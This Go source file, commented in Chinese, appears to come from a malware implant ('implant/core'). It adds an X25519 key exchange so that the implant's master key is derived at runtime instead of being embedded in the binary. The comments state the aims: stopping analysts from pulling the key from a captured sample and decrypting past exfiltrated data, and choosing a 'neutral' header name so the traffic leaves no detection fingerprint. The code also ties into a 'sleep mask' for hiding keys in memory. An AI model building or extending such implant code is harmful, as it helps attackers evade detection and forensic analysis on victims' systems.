package encrypt

import (
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"sync"
	"time"

	"golang.org/x/crypto/hkdf"

	"implant/core/config"
	"implant/core/debuglog"
)

// ===== 主密钥运行时派生（ECDH / X25519）=====
//
// 要解决的问题：主密钥目前是**编译期等长明文 patch** 进载荷的
// （pkg/delivery/payload.go 的 replaceOrErr 要求等长 ⇒ 原样写入 32 字节）。
// 于是拿到任意一个载荷样本就能静态提取主密钥，进而解开全部历史回传 ——
// 这是整条链路上唯一"一次泄露、永久失效"的凭据。
//
// 改造思路：主密钥不再来自二进制，而是**首连时用 X25519 临时交换派生**。
// 关键接缝是 globalMasterKey —— 会话密钥的派生物
// （SetSessionKeyWithNonce 的重派生、AEAD 缓存、sleep mask 的遮蔽目标）
// 全部只依赖它，所以只换它的来源，下游一行都不用动。
//
// 为什么用 crypto/ecdh 而不是自己拼 curve25519：
// 标准库（Go 1.20+）已内置，且双方都是 Go，少一个依赖少一处版本风险。
//
// 为什么还要检查"共享密钥全零"：
// X25519 对**低阶点**不报错，算出的共享密钥是全零。攻击者可借此把受害者的
// 共享密钥固定成已知值（小子群攻击）。标准做法就是算完检查是否全零并拒绝。

const (
	// ECDHKeyInfo HKDF 的 info 上下文（与报告里其它 info 常量区分开：
	// 会话密钥用 config.SessionKeyInfo()，这里用独立字符串，两把密钥互不相关）
	ECDHKeyInfo = "tshell-ecdh-v1"

	// ECDHPublicKeySize X25519 公钥长度
	ECDHPublicKeySize = 32

	// ECDHSharedKeySize 派生出的主密钥长度（AES-256）
	ECDHSharedKeySize = 32

	// KxHeaderName 会话前明文交换用的头部名。
	//
	// 取名刻意**中性**：它出现在每个首次请求里，名字本身不能被当成特征
	// （对比现有 padding 用的 "X-Client-Data"，那个名字已经是个稳定指纹）。
	KxHeaderName = "X-Kx"
)

// 主密钥是否已被运行时派生值替换（供"必须走 ECDH"的部署自检）
var (
	masterKeyReplacedMu sync.RWMutex
	masterKeyReplaced   bool
)

// ErrBadPeerPublicKey 对端公钥不可用（长度错、解码失败、或低阶点导致共享密钥全零）
var ErrBadPeerPublicKey = errors.New("对端公钥不可用")

// KeyExchange 客户端的一次性临时密钥对。
//
// 生命周期：每次上线尝试新建一个，交换完成后即可丢弃（私钥用完就不再需要）。
// 不做复用是有意的 —— 复用会让"一次泄露 = 全部会话"重新成立。
type KeyExchange struct {
	priv *ecdh.PrivateKey
	pub  []byte
}

// NewKeyExchange 生成临时 X25519 密钥对
func NewKeyExchange() (*KeyExchange, error) {
	curve := ecdh.X25519()
	priv, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		return nil, fmt.Errorf("生成临时密钥对失败: %w", err)
	}
	pub := priv.PublicKey().Bytes()
	if len(pub) != ECDHPublicKeySize {
		return nil, fmt.Errorf("公钥长度异常: %d", len(pub))
	}
	return &KeyExchange{priv: priv, pub: append([]byte{}, pub...)}, nil
}

// PublicKey 32 字节原始公钥
func (kx *KeyExchange) PublicKey() []byte {
	if kx == nil {
		return nil
	}
	return append([]byte{}, kx.pub...)
}

// HeaderValue 用于放进请求头的 base64 形式
func (kx *KeyExchange) HeaderValue() string {
	if kx == nil {
		return ""
	}
	return base64.StdEncoding.EncodeToString(kx.pub)
}

// DeriveMasterKey 用对端公钥与 salt 派生主密钥。
//
// salt 用监听器的加密盐（与既有会话密钥派生同一份盐）：
// 这样即便同一对临时密钥被复用（不应发生），不同监听器也得到不同的主密钥。
func (kx *KeyExchange) DeriveMasterKey(peerPub, salt []byte) ([]byte, error) {
	if kx == nil || kx.priv == nil {
		return nil, errors.New("临时密钥对未初始化")
	}
	shared, err := rawX25519Shared(kx.priv, peerPub)
	if err != nil {
		return nil, err
	}
	defer wipeBytes(shared)
	return deriveMasterKeyFromShared(shared, salt)
}

// rawX25519Shared 计算原始共享密钥，并拒绝全零结果（低阶点）。
//
// 单独抽出来是为了能用 RFC 7748 的测试向量**逐字节**验证这一层，
// 而不只是验证"两边算出来一样"（两边一起错也能通过后者）。
func rawX25519Shared(priv *ecdh.PrivateKey, peerPub []byte) ([]byte, error) {
	if len(peerPub) != ECDHPublicKeySize {
		return nil, fmt.Errorf("%w: 长度应为 %d，实际 %d", ErrBadPeerPublicKey, ECDHPublicKeySize, len(peerPub))
	}
	pub, err := ecdh.X25519().NewPublicKey(peerPub)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrBadPeerPublicKey, err)
	}
	shared, err := priv.ECDH(pub)
	if err != nil {
		return nil, fmt.Errorf("%w: %v", ErrBadPeerPublicKey, err)
	}
	// 低阶点（含全零公钥）会让共享密钥为全零 —— 必须拒绝，
	// 否则攻击者能把共享密钥固定成已知值。
	var acc byte
	for _, b := range shared {
		acc |= b
	}
	if acc == 0 {
		wipeBytes(shared)
		return nil, fmt.Errorf("%w: 共享密钥为全零（低阶点攻击）", ErrBadPeerPublicKey)
	}
	return shared, nil
}

// deriveMasterKeyFromShared HKDF-SHA256(shared, salt, info) → 32 字节
func deriveMasterKeyFromShared(shared, salt []byte) ([]byte, error) {
	if len(shared) == 0 {
		return nil, errors.New("共享密钥为空")
	}
	hk := hkdf.New(sha256.New, shared, salt, []byte(ECDHKeyInfo))
	out := make([]byte, ECDHSharedKeySize)
	if _, err := io.ReadFull(hk, out); err != nil {
		return nil, fmt.Errorf("派生主密钥失败: %w", err)
	}
	return out, nil
}

// ParsePeerPublicKey 解析 base64 公钥（对端头部值）
func ParsePeerPublicKey(b64 string) ([]byte, error) {
	if b64 == "" {
		return nil, fmt.Errorf("%w: 空值", ErrBadPeerPublicKey)
	}
	raw, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		return nil, fmt.Errorf("%w: base64 解码失败: %v", ErrBadPeerPublicKey, err)
	}
	if len(raw) != ECDHPublicKeySize {
		return nil, fmt.Errorf("%w: 长度应为 %d，实际 %d", ErrBadPeerPublicKey, ECDHPublicKeySize, len(raw))
	}
	return raw, nil
}

// wipeBytes 就地清零（密钥材料用完不留在内存里等 GC）
func wipeBytes(b []byte) {
	for i := range b {
		b[i] = 0
	}
}

// ReplaceMasterKey 用运行时派生的主密钥替换编译期的静态主密钥。
//
// 这是整个改造的**唯一接缝**：替换后 SetSessionKeyWithNonce、
// SetSessionKeyRotate、AEAD 缓存与 sleep mask 全部自动跟随，无需改动。
//
// 必须同时作废旧派生物：会话密钥是用旧主密钥派生的，留着会继续用错误的密钥
// 加密（服务端表现为 GCM 认证失败，排查方向完全对不上）。
func (ckm *ClientKeyManager) ReplaceMasterKey(secret []byte) error {
	if len(secret) < ECDHSharedKeySize {
		return fmt.Errorf("主密钥长度不足: %d", len(secret))
	}
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	if ckm.masked {
		// 遮蔽期间密钥材料是 XOR 过的，此刻替换会留下半遮蔽状态
		return errors.New("密钥处于遮蔽状态，不能替换主密钥")
	}

	// 旧材料清零（不是简单覆盖引用）
	wipeBytes(globalMasterKey)
	wipeBytes(ckm.sessionKey)
	wipeBytes(ckm.previousKey)

	mk := make([]byte, ECDHSharedKeySize)
	copy(mk, secret[:ECDHSharedKeySize])
	globalMasterKey = mk

	// 旧会话密钥由旧主密钥派生，必须作废；调用方随后用 SetSessionKey/WithNonce 重建
	ckm.sessionKey = nil
	ckm.previousKey = nil
	ckm.keyVersion++
	ckm.keyID = ""
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)

	// AEAD 缓存以密钥字节为 map key，不清等于又留一份旧密钥
	aeadCache.Range(func(k, _ interface{}) bool {
		aeadCache.Delete(k)
		return true
	})

	masterKeyReplacedMu.Lock()
	masterKeyReplaced = true
	masterKeyReplacedMu.Unlock()

	debuglog.Printf("🔑 [CLIENT] 主密钥已替换为运行时派生值（静态主密钥作废）\n")
	return nil
}

// MasterKeyReplaced 报告当前主密钥是否已被运行时派生值替换。
//
// 用于"必须走 ECDH"的部署做自检：静态主密钥仍生效时返回 false，
// 调用方据此决定是否拒绝上线（而不是静默继续用编译期密钥）。
func MasterKeyReplaced() bool {
	masterKeyReplacedMu.RLock()
	defer masterKeyReplacedMu.RUnlock()
	return masterKeyReplaced
}

// SetSessionKeyPreferringKX 按"是否已完成 KX 交换"选择主密钥来源来建立会话密钥。
//
// 为什么需要这个函数（这是一个真实踩到的坑）：
// `SetSessionKey(salt, masterKey)` 会用**参数里的** masterKey 覆盖 globalMasterKey。
// 而 KX 交换完成后，正确的主密钥是派生值，不是编译期静态值。若 Connect 里
// 在 kxHandshake 之后仍调用 SetSessionKey(salt, staticMasterKey)，会出现：
//
//	客户端会话密钥 = HKDF(静态密钥, …)
//	服务端会话密钥 = HKDF(派生密钥, …)
//
// 两者不同 → 之后所有加解密失败，而现象只是"上线后又掉线"，极难定位。
//
// 所以把判断收敛到这里：已完成 KX 就走派生密钥，否则走静态密钥。
// 调用方不该自己判断 —— 判断点分散就等于迟早漏一处。
func (ckm *ClientKeyManager) SetSessionKeyPreferringKX(salt, staticMasterKey []byte) error {
	if MasterKeyReplaced() {
		return ckm.deriveSessionKeyFromCurrentMaster(salt)
	}
	return ckm.SetSessionKey(salt, staticMasterKey)
}

// deriveSessionKeyFromCurrentMaster 用当前的 globalMasterKey 派生会话密钥
// （与 SetSessionKey 同公式，只是主密钥来源换成已替换的值）。
func (ckm *ClientKeyManager) deriveSessionKeyFromCurrentMaster(salt []byte) error {
	ckm.mu.Lock()
	defer ckm.mu.Unlock()

	if len(globalMasterKey) < 32 {
		return errors.New("主密钥未初始化，无法派生会话密钥")
	}
	if len(salt) >= 16 {
		sl := make([]byte, 16)
		copy(sl, salt[:16])
		globalSalt = sl
	}
	mk := make([]byte, 32)
	copy(mk, globalMasterKey[:32])

	hk := hkdf.New(sha256.New, mk, salt, []byte(config.SessionKeyInfo()+ckm.clientID))
	sessionKey := make([]byte, 32)
	if _, err := io.ReadFull(hk, sessionKey); err != nil {
		return fmt.Errorf("派生会话密钥失败: %v", err)
	}
	ckm.sessionKey = sessionKey
	ckm.keyVersion++
	ckm.createdAt = time.Now()
	ckm.expiresAt = time.Now().Add(24 * time.Hour)
	debuglog.Printf("🔑 [CLIENT] 会话密钥已用 KX 派生主密钥建立（version=%d）\n", ckm.keyVersion)
	return nil
}
